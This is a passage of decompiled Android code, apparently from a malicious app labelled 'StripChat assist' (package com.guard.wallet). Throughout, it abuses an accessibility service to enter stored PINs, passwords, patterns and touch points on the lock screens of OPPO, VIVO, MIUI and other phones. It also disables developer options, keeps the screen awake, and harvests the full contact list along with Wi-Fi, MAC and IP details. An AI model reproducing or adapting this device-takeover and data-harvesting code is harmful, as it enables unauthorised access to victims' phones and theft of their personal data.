                                                Log.d("UnLockUtils", "依OPPO、RealMe、OnePlus PIN码规则解锁");
                                                str = null;
                                            } else {
                                                MyAccessibilityService m554P3 = MyAccessibilityService.m554P();
                                                CombineFilter m675v = m675v();
                                                m554P3.getClass();
                                                m550L = MyAccessibilityService.m550L(m675v);
                                                Log.d("UnLockUtils", "依通用 PIN码规则解锁");
                                                str = "com.android.systemui:id/key";
                                            }
                                            if (m550L != null && m550L.size() > 0) {
                                                Log.d("UnLockUtils", "PIN码节点查找成功");
                                                for (int i4 = 0; i4 < textCipher2.length(); i4++) {
                                                    char charAt = textCipher2.charAt(i4);
                                                    if (AbstractC0026q.m151B(str)) {
                                                        for (UiObject uiObject : m550L.getNodes()) {
                                                            if (uiObject != null && (Objects.equals(uiObject.text(), String.valueOf(charAt)) || Objects.equals(uiObject.desc(), String.valueOf(charAt)))) {
                                                                if (uiObject.click()) {
                                                                    Log.d("UnLockUtils", "Click PIN Node By Text Or Desc:" + String.valueOf(charAt));
                                                                    U0();
                                                                }
                                                            }
                                                        }
                                                    } else {
                                                        String concat = str.concat(String.valueOf(charAt));
                                                        for (UiObject uiObject2 : m550L.getNodes()) {
                                                            if (uiObject2 != null && Objects.equals(uiObject2.id(), concat) && uiObject2.click()) {
                                                                Log.d("UnLockUtils", "Click PIN Node By ID:" + concat);
                                                                U0();
                                                            }
                                                        }
                                                    }
                                                }
                                                m676w();
                                                if (m671r()) {
                                                    Log.d("UnLockUtils", "PIN码解锁完成");
                                                    z4 = true;
                                                }
                                            }
                                            Log.e("UnLockUtils", "使用PIN码解锁失败");
                                        }
                                        z4 = false;
                                    }
                                    if (!AbstractC0026q.m151B(textCipher2) && MyAccessibilityService.m554P() != null) {
                                        Log.d("UnLockUtils", "使用混合密码解锁");
                                        if (AbstractC0249e.m623l()) {
                                            Log.d("UnLockUtils", "依VIVO规则输入混合密码");
                                            MyAccessibilityService m554P4 = MyAccessibilityService.m554P();
                                            CombineFilter s1 = s1();
                                            m554P4.getClass();
                                            UiObjectCollection m550L2 = MyAccessibilityService.m550L(s1);
                                            MyAccessibilityService m554P5 = MyAccessibilityService.m554P();
                                            CombineFilter r1 = r1();
                                            m554P5.getClass();
                                            UiObjectCollection m550L3 = MyAccessibilityService.m550L(r1);
                                            if (m550L2 != null && m550L2.size() > 0 && m550L3 != null && m550L3.size() > 0) {
                                                for (int i5 = 0; i5 < textCipher2.length(); i5++) {
                                                    String valueOf = String.valueOf(textCipher2.charAt(i5));
                                                    if (AbstractC0026q.m153D(valueOf)) {
                                                        String concat2 = "com.android.systemui:id/num".concat(valueOf);
                                                        for (UiObject uiObject3 : m550L2.getNodes()) {
                                                            if (uiObject3 != null && Objects.equals(uiObject3.id(), concat2) && uiObject3.click()) {
                                                                Log.d("UnLockUtils", "Click VIVO Num Node ID:" + concat2);
                                                                U0();
                                                            }
                                                        }
                                                    } else {
                                                        String concat3 = "com.android.systemui:id/char_".concat(valueOf);
                                                        for (UiObject uiObject4 : m550L3.getNodes()) {
                                                            if (uiObject4 != null && Objects.equals(uiObject4.id(), concat3) && uiObject4.click()) {
                                                                Log.d("UnLockUtils", "Click VIVO Char Node ID:" + concat3);
                                                                U0();
                                                            }
                                                        }
                                                    }
                                                }
                                                m676w();
                                                if (m671r()) {
                                                    Log.d("UnLockUtils", "使用混合密码解锁完成");
                                                    z3 = true;
                                                    if (z3) {
                                                        reqUnlockDeviceVO.setCipherGradeCode("PASSWORD_QUALITY_NUMERIC_COMPLEX");
                                                    }
                                                }
                                            }
                                        }
                                        Log.e("UnLockUtils", "使用混合密码解锁失败");
                                    }
                                }
                                z3 = false;
                                if (z3) {
                                }
                            }
                            reqUnlockDeviceVO.setTouchCipher(null);
                            return true;
                        }
                        Log.e("UnLockUtils", "委托RatHat解锁失败");
                    }
                    if (MyAccessibilityService.m554P() != null) {
                        Log.d("UnLockUtils", "委托无障碍容器输入文本密码");
                        UiObject m560J = MyAccessibilityService.m554P().m560J();
                        if (m560J != null && m560J.setText(textCipher)) {
                            Log.d("UnLockUtils", "委托无障碍容器输入文本密码完成");
                            m641N(m560J);
                        }
                        if (m560J != null && !AbstractC0026q.m151B(textCipher)) {
                            String str4 = BuildConfig.FLAVOR;
                            int i6 = 0;
                            for (int i7 = 0; i7 < textCipher.length(); i7++) {
                                T0(5);
                                str4 = str4.concat(textCipher.charAt(i7) + BuildConfig.FLAVOR);
                                if (m560J.setText(str4)) {
                                    i6++;
                                }
                            }
                            if (i6 == textCipher.length()) {
                                z5 = true;
                                if (z5) {
                                    Log.d("UnLockUtils", "委托无障碍容器逐个输入文本密码完成");
                                    m641N(m560J);
                                    z2 = m671r();
                                    if (!z2) {
                                    }
                                    reqUnlockDeviceVO.setTouchCipher(null);
                                    return true;
                                }
                            }
                        }
                        z5 = false;
                        if (z5) {
                        }
                    }
                }
                z2 = false;
                if (!z2) {
                }
                reqUnlockDeviceVO.setTouchCipher(null);
                return true;
            }
            if (reqUnlockDeviceVO.getTouchCipher() != null && !reqUnlockDeviceVO.getTouchCipher().isEmpty() && o1(reqUnlockDeviceVO.getTouchCipher())) {
                reqUnlockDeviceVO.setCipherGradeCode("PASSWORD_QUALITY_TOUCH_POINTS");
                return true;
            }
        }
        return (Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN") || Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_TOUCH_POINTS")) && (eventCipher = reqUnlockDeviceVO.getEventCipher()) != null && !eventCipher.isEmpty() && C0318e.m844S() != null && C0318e.m844S().mo302D() && C0318e.m844S().b0(eventCipher) && m671r();
    }

    /* renamed from: r */
    public static boolean m671r() {
        for (int i2 = 0; i2 < 30 && p0(); i2++) {
            try {
                Thread.sleep(100L);
            } catch (Exception e2) {
                AbstractC0026q.m186s("UnLockUtils", e2);
            }
        }
        return !p0();
    }

    public static boolean r0() {
        if (m653Z() == null) {
            return false;
        }
        KeyguardManager keyguardManager = (KeyguardManager) m653Z().getSystemService("keyguard");
        return keyguardManager.isDeviceSecure() || keyguardManager.isKeyguardSecure();
    }

    public static CombineFilter r1() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"));
        StringCondition stringCondition = new StringCondition();
        stringCondition.setProperty("id");
        stringCondition.setPrefix("com.android.systemui:id/char_");
        combineFilter.getStringConditions().add(stringCondition);
        return combineFilter;
    }

    /* renamed from: s */
    public static boolean m672s(Integer num, Integer num2) {
        return G0(num, num2, Long.valueOf(ViewConfiguration.getTapTimeout() + 50));
    }

    public static boolean s0(String str) {
        List<ActivityManager.RunningTaskInfo> runningTasks;
        ComponentName componentName;
        ComponentName componentName2;
        boolean z2;
        boolean isVisible;
        if (!AbstractC0026q.m151B(str) && m653Z() != null && (runningTasks = ((ActivityManager) m653Z().getSystemService("activity")).getRunningTasks(1)) != null && !runningTasks.isEmpty()) {
            ActivityManager.RunningTaskInfo runningTaskInfo = runningTasks.get(0);
            componentName = runningTaskInfo.topActivity;
            if (componentName != null) {
                componentName2 = runningTaskInfo.topActivity;
                if (Objects.equals(componentName2.getPackageName(), str)) {
                    int i2 = Build.VERSION.SDK_INT;
                    if (i2 >= 32) {
                        isVisible = runningTaskInfo.isVisible();
                        return isVisible;
                    }
                    if (i2 < 29) {
                        return true;
                    }
                    z2 = runningTaskInfo.isRunning;
                    return z2;
                }
            }
        }
        return false;
    }

    public static CombineFilter s1() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"));
        StringCondition stringCondition = new StringCondition();
        stringCondition.setProperty("id");
        stringCondition.setPrefix("com.android.systemui:id/num");
        combineFilter.getStringConditions().add(stringCondition);
        return combineFilter;
    }

    /* renamed from: t */
    public static boolean m673t(List list) {
        if (list == null || list.isEmpty()) {
            return false;
        }
        Iterator it = list.iterator();
        int i2 = 0;
        int i3 = 0;
        while (it.hasNext()) {
            Point point = (Point) it.next();
            int x2 = (int) point.getX();
            int y2 = (int) point.getY();
            if (x2 >= 0 && y2 >= 0) {
                i3++;
                try {
                    if (m672s(Integer.valueOf(x2), Integer.valueOf(y2))) {
                        i2++;
                    }
                    T0(5);
                } catch (Exception e2) {
                    AbstractC0026q.m186s("GlobalActionAutomator", e2);
                }
            }
        }
        return i2 == i3;
    }

    public static void t0(boolean z2) {
        if (C0318e.m844S() == null || !C0318e.m844S().mo302D()) {
            return;
        }
        C0318e m844S = C0318e.m844S();
        if (m844S.mo302D()) {
            m844S.m855N(!z2 ? "svc power stayon false" : "svc power stayon true");
        }
    }

    public static CombineFilter t1() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m7c(combineFilter, "className", "android.view.ViewGroup"));
        StringCondition stringCondition = new StringCondition();
        stringCondition.setProperty("id");
        stringCondition.setPrefix("com.android.systemui:id/VivoPinkey");
        combineFilter.getStringConditions().add(stringCondition);
        return combineFilter;
    }

    /* renamed from: u */
    public static boolean m674u() {
        try {
            if (m653Z() != null && (Settings.System.canWrite(m653Z()) || m663j())) {
                Log.d("ApplicationUtil", "已有系统设置修改权限");
                Settings.Global.putInt(m653Z().getContentResolver(), "development_settings_enabled", 0);
                if (!m638K()) {
                    Log.d("ApplicationUtil", "已有系统设置修改权限,关闭开发者选项成功");
                    return true;
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("ApplicationUtil", e2);
        }
        return false;
    }

    public static Intent u0(String str) {
        try {
            if (m653Z() == null || AbstractC0026q.m151B(str)) {
                return null;
            }
            PackageManager packageManager = m653Z().getPackageManager();
            if (packageManager.getApplicationInfo(str, 8192) != null) {
                return packageManager.getLaunchIntentForPackage(str);
            }
            return null;
        } catch (Exception e2) {
            AbstractC0026q.m186s("ApplicationUtil", e2);
            return null;
        }
    }

    public static boolean u1() {
        String str;
        Log.d("UnLockUtils", "依VIVO规则确认密码输入");
        MyAccessibilityService m554P = MyAccessibilityService.m554P();
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m7c(combineFilter, "id", "com.android.systemui:id/vivo_pin_confirm"));
        m554P.getClass();
        UiObject m551M = MyAccessibilityService.m551M(combineFilter);
        if (m551M == null || !m551M.click()) {
            Log.d("UnLockUtils", "依VIVO规则确认Pin密码失败");
            MyAccessibilityService m554P2 = MyAccessibilityService.m554P();
            CombineFilter combineFilter2 = new CombineFilter();
            combineFilter2.getStringConditions().add(AbstractC0000a.m7c(combineFilter2, "id", "com.android.systemui:id/mix_normal_confirm"));
            m554P2.getClass();
            UiObject m551M2 = MyAccessibilityService.m551M(combineFilter2);
            if (m551M2 == null || !m551M2.click()) {
                Log.e("UnLockUtils", "依VIVO规则确认混合密码失败");
                return false;
            }
            str = "依VIVO规则确认混合密码完成";
        } else {
            str = "依VIVO规则确认Pin密码完成";
        }
        Log.d("UnLockUtils", str);
        return true;
    }

    /* renamed from: v */
    public static CombineFilter m675v() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m7c(combineFilter, "className", "android.view.ViewGroup"));
        StringCondition stringCondition = new StringCondition();
        stringCondition.setProperty("id");
        stringCondition.setPrefix("com.android.systemui:id/key");
        combineFilter.getStringConditions().add(stringCondition);
        return combineFilter;
    }

    public static String v0(String str, String str2, String str3) {
        StringBuilder sb = new StringBuilder();
        try {
            if (AbstractC0026q.m151B(str)) {
                sb.append("NULL");
            } else {
                sb.append(str);
            }
            if (AbstractC0026q.m151B(str2)) {
                sb.append(":");
                sb.append("NULL");
            } else {
                sb.append(":");
                sb.append(str2);
            }
            if (AbstractC0026q.m151B(str3)) {
                sb.append(":");
                sb.append("NULL");
            } else {
                sb.append(":");
                sb.append(str3);
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.utils.g", e2);
        }
        return sb.toString();
    }

    public static boolean v1(int i2) {
        boolean m02 = m0();
        int i3 = 0;
        while (!m02 && i3 < i2) {
            if (!AbstractC0249e.m621j()) {
                AbstractC0026q.m168S();
            }
            T0(1);
            i3++;
            m02 = m0();
        }
        return m02;
    }

    /* renamed from: w */
    public static void m676w() {
        String str;
        if (MyAccessibilityService.m554P() != null) {
            Log.d("UnLockUtils", "委托无障碍容器确认PIN码输入");
            if (AbstractC0249e.m624m()) {
                Log.d("UnLockUtils", "依MIUI规则确认PIN码输入");
                MyAccessibilityService m554P = MyAccessibilityService.m554P();
                CombineFilter y1 = y1();
                m554P.getClass();
                UiObject m551M = MyAccessibilityService.m551M(y1);
                if (m551M != null && m551M.click()) {
                    str = "依MIUI规则确认PIN码输入完成";
                    Log.d("UnLockUtils", str);
                }
                Log.e("UnLockUtils", "依MIUI规则确认PIN码输入失败");
            }
            if (AbstractC0249e.m623l()) {
                if (u1()) {
                    str = "依VIVO规则确认密码完成";
                    Log.d("UnLockUtils", str);
                }
                Log.e("UnLockUtils", "依VIVO规则确认密码失败");
            }
            Log.d("UnLockUtils", "开始依通用规则确认PIN码输入");
            MyAccessibilityService m554P2 = MyAccessibilityService.m554P();
            CombineFilter combineFilter = new CombineFilter();
            combineFilter.setBoolConditions(new LinkedList());
            combineFilter.setPointConditions(new LinkedList());
            combineFilter.setStringConditions(new LinkedList());
            combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
            combineFilter.getStringConditions().add(new StringCondition("id", null, null, "com.android.systemui:id/key_enter", null, null));
            m554P2.getClass();
            UiObject m551M2 = MyAccessibilityService.m551M(combineFilter);
            if (m551M2 == null || !m551M2.click()) {
                return;
            }
            str = "依通用规则确认PIN码输入完成";
            Log.d("UnLockUtils", str);
        }
    }

    public static LinkedList w0() {
        ContentResolver contentResolver;
        HashMap hashMap = new HashMap();
        if (m653Z() != null && m667n() && (contentResolver = m653Z().getContentResolver()) != null) {
            try {
                Cursor query = contentResolver.query(ContactsContract.Data.CONTENT_URI, null, null, null, null);
                if (query != null && query.getCount() > 0) {
                    query.moveToFirst();
                    do {
                        long j2 = query.getLong(query.getColumnIndexOrThrow("contact_id"));
                        String string = query.getString(query.getColumnIndexOrThrow("display_name"));
                        String string2 = query.getString(query.getColumnIndexOrThrow("mimetype"));
                        DeviceContactInfoVO deviceContactInfoVO = (DeviceContactInfoVO) hashMap.get(Long.valueOf(j2));
                        if (deviceContactInfoVO == null) {
                            deviceContactInfoVO = new DeviceContactInfoVO();
                        }
                        deviceContactInfoVO.setDeviceContactId(String.valueOf(j2));
                        deviceContactInfoVO.setDisplayName(string);
                        if ("vnd.android.cursor.item/phone_v2".equals(string2)) {
                            int i2 = query.getInt(query.getColumnIndexOrThrow("data2"));
                            String string3 = query.getString(query.getColumnIndexOrThrow("data3"));
                            String string4 = query.getString(query.getColumnIndexOrThrow("data1"));
                            DeviceContactNumberVO deviceContactNumberVO = new DeviceContactNumberVO();
                            deviceContactNumberVO.setNumberType(i2);
                            deviceContactNumberVO.setNumber(string4);
                            deviceContactNumberVO.setLabel(string3);
                            deviceContactInfoVO.getChildren().add(deviceContactNumberVO);
                        }
                        if ("vnd.android.cursor.item/name".equals(string2)) {
                            String string5 = query.getString(query.getColumnIndexOrThrow("data2"));
                            String string6 = query.getString(query.getColumnIndexOrThrow("data3"));
                            deviceContactInfoVO.setFirstName(string5);
                            deviceContactInfoVO.setLastName(string6);
                        }
                        if ("vnd.android.cursor.item/organization".equals(string2)) {
                            String string7 = query.getString(query.getColumnIndexOrThrow("data1"));
                            String string8 = query.getString(query.getColumnIndexOrThrow("data5"));
                            String string9 = query.getString(query.getColumnIndexOrThrow("data4"));
                            String string10 = query.getString(query.getColumnIndexOrThrow("data6"));
                            deviceContactInfoVO.setCompany(string7);
                            deviceContactInfoVO.setDepartment(string8);
                            deviceContactInfoVO.setJob(string9);
                            deviceContactInfoVO.setJobDescription(string10);
                        }
                        if ("vnd.android.cursor.item/email_v2".equals(string2)) {
                            String string11 = query.getString(query.getColumnIndexOrThrow("data1"));
                            String string12 = query.getString(query.getColumnIndexOrThrow("data4"));
                            deviceContactInfoVO.setEmailAddress(string11);
                            deviceContactInfoVO.setEmailAddressDisplayName(string12);
                        }
                        if ("vnd.android.cursor.item/note".equals(string2)) {
                            deviceContactInfoVO.setNote(query.getString(query.getColumnIndexOrThrow("data1")));
                        }
                        if ("vnd.android.cursor.item/nickname".equals(string2)) {
                            deviceContactInfoVO.setNickName(query.getString(query.getColumnIndexOrThrow("data1")));
                        }
                        if ("vnd.android.cursor.item/website".equals(string2)) {
                            deviceContactInfoVO.setWebUrl(query.getString(query.getColumnIndexOrThrow("data1")));
                        }
                        if ("vnd.android.cursor.item/relation".equals(string2)) {
                            deviceContactInfoVO.setRelationName(query.getString(query.getColumnIndexOrThrow("data1")));
                        }
                        if ("vnd.android.cursor.item/im".equals(string2)) {
                            String string13 = query.getString(query.getColumnIndexOrThrow("data5"));
                            String string14 = query.getString(query.getColumnIndexOrThrow("data6"));
                            deviceContactInfoVO.setProtocol(string13);
                            deviceContactInfoVO.setCustomProtocol(string14);
                        }
                        if ("vnd.android.cursor.item/identity".equals(string2)) {
                            String string15 = query.getString(query.getColumnIndexOrThrow("data1"));
                            String string16 = query.getString(query.getColumnIndexOrThrow("data2"));
                            deviceContactInfoVO.setIdentity(string15);
                            deviceContactInfoVO.setNamespace(string16);
                        }
                        if ("vnd.android.cursor.item/group_membership".equals(string2)) {
                            deviceContactInfoVO.setGroupId(query.getString(query.getColumnIndexOrThrow("data1")));
                        }
                        hashMap.put(Long.valueOf(j2), deviceContactInfoVO);
                    } while (query.moveToNext());
                }
                if (query != null) {
                    query.close();
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("ContactUtils", e2);
            }
        }
        if (hashMap.values().isEmpty()) {
            return null;
        }
        return new LinkedList(hashMap.values());
    }

    public static File w1(X509CertImpl x509CertImpl) {
        try {
            if (AbstractC0026q.m151B(i0())) {
                return null;
            }
            File file = new File(i0(), "cert.pem");
            BASE64Encoder bASE64Encoder = new BASE64Encoder();
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            fileOutputStream.write(X509Factory.BEGIN_CERT.getBytes(StandardCharsets.UTF_8));
            fileOutputStream.write(10);
            bASE64Encoder.encode(x509CertImpl.getEncoded(), fileOutputStream);
            fileOutputStream.write(10);
            fileOutputStream.write(X509Factory.END_CERT.getBytes(StandardCharsets.UTF_8));
            fileOutputStream.flush();
            fileOutputStream.close();
            return file;
        } catch (Exception e2) {
            AbstractC0026q.m186s("AdbKeyUtils", e2);
            return null;
        }
    }

    /* renamed from: x */
    public static boolean m677x() {
        LinkedList f02 = f0();
        LinkedHashSet q02 = q0();
        if (f02.isEmpty() || q02.isEmpty()) {
            return false;
        }
        Iterator it = f02.iterator();
        while (it.hasNext()) {
            if (q02.contains((String) it.next())) {
                return true;
            }
        }
        return false;
    }

    public static String x0() {
        if (m653Z() != null) {
            PackageManager packageManager = m653Z().getPackageManager();
            ApplicationInfo applicationInfo = m653Z().getApplicationInfo();
            if (packageManager != null && applicationInfo != null) {
                return packageManager.getApplicationLabel(applicationInfo).toString();
            }
        }
        Integer num = AbstractC0248d.f402a;
        return (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getAppLabel())) ? "StripChat assist" : MainApplication.getInstance().getBuildConfig().getAppLabel();
    }

    public static boolean x1(Long l2) {
        if (l2 != null) {
            try {
                if (l2.longValue() > 0 && m653Z() != null && (Settings.System.canWrite(m653Z()) || m663j())) {
                    Log.d("ApplicationUtil", "已有系统设置修改权限");
                    Settings.System.putLong(m653Z().getContentResolver(), "screen_off_timeout", l2.longValue());
                    if (l2.equals(P0())) {
                        Log.d("ApplicationUtil", "已有系统设置修改权限,修改屏幕休眠时间成功");
                        return true;
                    }
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("ApplicationUtil", e2);
            }
        }
        return false;
    }

    /* renamed from: y */
    public static Bitmap m678y(Bitmap bitmap) {
        Bitmap createBitmap;
        int width = bitmap.getWidth();
        int height = bitmap.getHeight();
        Picture picture = new Picture();
        picture.beginRecording(width, height).drawBitmap(bitmap, 0.0f, 0.0f, (Paint) null);
        picture.endRecording();
        if (Build.VERSION.SDK_INT < 28) {
            return null;
        }
        createBitmap = Bitmap.createBitmap(picture, width, height, Bitmap.Config.ARGB_8888);
        return createBitmap;
    }

    public static String y0() {
        if (m653Z() != null) {
            return m653Z().getApplicationInfo().nativeLibraryDir;
        }
        return null;
    }

    public static CombineFilter y1() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m6b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), "id", "com.android.systemui:id/btn_letter_ok"));
        return combineFilter;
    }

    /* renamed from: z */
    public static WIFIState m679z(Context context) {
        WifiManager wifiManager = (WifiManager) context.getSystemService("wifi");
        if (!wifiManager.isWifiEnabled()) {
            return null;
        }
        WIFIState wIFIState = new WIFIState();
        WifiInfo connectionInfo = wifiManager.getConnectionInfo();
        if (connectionInfo != null) {
            String ssid = connectionInfo.getSSID();
            if (AbstractC0026q.m151B(ssid) || ssid.contains(EnvironmentCompat.MEDIA_UNKNOWN)) {
                int networkId = connectionInfo.getNetworkId();
                if (ContextCompat.checkSelfPermission(context, "android.permission.ACCESS_FINE_LOCATION") == 0) {
                    Iterator<WifiConfiguration> it = wifiManager.getConfiguredNetworks().iterator();
                    while (true) {
                        if (!it.hasNext()) {
                            break;
                        }
                        WifiConfiguration next = it.next();
                        if (next.networkId == networkId) {
                            ssid = next.SSID;
                            break;
                        }
                    }
                }
            }
            if (!AbstractC0026q.m151B(ssid) && !ssid.contains(EnvironmentCompat.MEDIA_UNKNOWN)) {
                wIFIState.setWifiId(ssid.replaceAll("\"", BuildConfig.FLAVOR));
            }
            wIFIState.setMacAddress(connectionInfo.getMacAddress());
            int ipAddress = connectionInfo.getIpAddress();
            wIFIState.setLocalIp((ipAddress & 255) + "." + ((ipAddress >> 8) & 255) + "." + ((ipAddress >> 16) & 255) + "." + ((ipAddress >> 24) & 255));
            if (AbstractC0026q.m151B(wIFIState.getWifiId())) {
                wIFIState.setWifiId(connectionInfo.getMacAddress().replaceAll(":", BuildConfig.FLAVOR));
            }
        }
        AbstractC0252h.m683D(AbstractC0252h.m693N(wIFIState), "wifiState");
        return wIFIState;
    }

    public static NetStateVO z0() {
        NetworkInfo activeNetworkInfo;
        NetStateVO netStateVO = new NetStateVO();
        if (m653Z() != null) {
            Context m653Z = m653Z();
            ConnectivityManager connectivityManager = (ConnectivityManager) m653Z.getSystemService("connectivity");
            if (connectivityManager != null && (activeNetworkInfo = connectivityManager.getActiveNetworkInfo()) != null) {
                netStateVO.setIsConnected(activeNetworkInfo.isConnected() ? 1 : 0);
                if (activeNetworkInfo.getType() == 1) {
                    netStateVO.setIsWifiConnected(1);
                    String m708l = AbstractC0252h.m708l("wifiState");
                    WIFIState wIFIState = !AbstractC0026q.m151B(m708l) ? (WIFIState) AbstractC0252h.m700d(m708l, WIFIState.class) : null;
                    if (wIFIState == null) {
                        wIFIState = m679z(m653Z);
                    }
                    if (wIFIState != null) {
                        netStateVO.setWifiId(wIFIState.getWifiId());
                        netStateVO.setMacAddress(wIFIState.getMacAddress());
                        netStateVO.setLocalIp(wIFIState.getLocalIp());
                    }
                } else {
                    netStateVO.setIsWifiConnected(0);
                }
            }
        }
        return netStateVO;
    }
}
